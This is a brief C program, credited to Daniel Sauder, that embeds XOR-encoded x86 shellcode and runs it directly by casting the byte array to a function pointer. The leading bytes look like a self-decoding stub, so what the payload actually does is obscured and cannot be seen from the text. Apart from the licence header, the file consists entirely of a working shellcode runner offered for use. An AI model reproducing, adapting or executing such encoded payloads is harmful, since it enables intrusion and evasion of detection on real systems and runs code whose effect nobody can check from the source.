/*
Author: Daniel Sauder
Website: http://govolution.wordpress.com/about
License http://creativecommons.org/licenses/by-sa/3.0/
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x22\x5e\x8d\x3e\x31\xc0\x31\xdb\x31\xc9\x8a\x1c\x06\x8a\x4c\x06\x01\x30\xcb\x88\x1f\x8a\x5c\x06\x02\x80\xf3\xaa\x74\x0a\x47\x04\x02\xeb\xe7\xe8\xd9\xff\xff\xff\x28\x19\xae\x6e\x78\x28\xc3\xab\x38\x17\x7f\x50\x02\x71\xff\x97\x05\x6d\x90\xbf\x3a\x58\x14\x7d\x76\x18\xf4\x7d\x35\xd6\xcf\x9f\xd7\x5e\xec\x0e\x96\xc5\x95\x1c\x72\x93\xa8\x18\xc0\xcb\xf9\x34\x9e\x1e\xaa";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
